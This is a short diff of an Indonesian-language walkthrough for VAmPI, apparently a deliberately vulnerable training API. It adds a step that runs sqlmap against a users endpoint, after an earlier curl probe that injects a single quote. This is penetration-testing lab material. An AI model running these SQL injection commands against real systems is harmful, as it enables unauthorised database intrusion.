@@ -18,3 +18,12 @@ curl http://IP_Server:5000/users/v1/test%27 --proxy http://127.0.0.1:8080
 ![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/sql%20injection/sqli%203.JPG)
 
 ![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/sql%20injection/sqli%204.JPG)
+
+- Sekarang kita coba lakukan SQL Injection dengan tool sqlmap
+```sh
+sqlmap -u "http://IP_Server:5000/users/v1/test" --batch
+```
+
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/sql%20injection/sqli%205.JPG)
+
+![alt text](https://github.com/rahardian-dwi-saputra/vampi-walkthrough/blob/main/assets/sql%20injection/sqli%206.JPG)
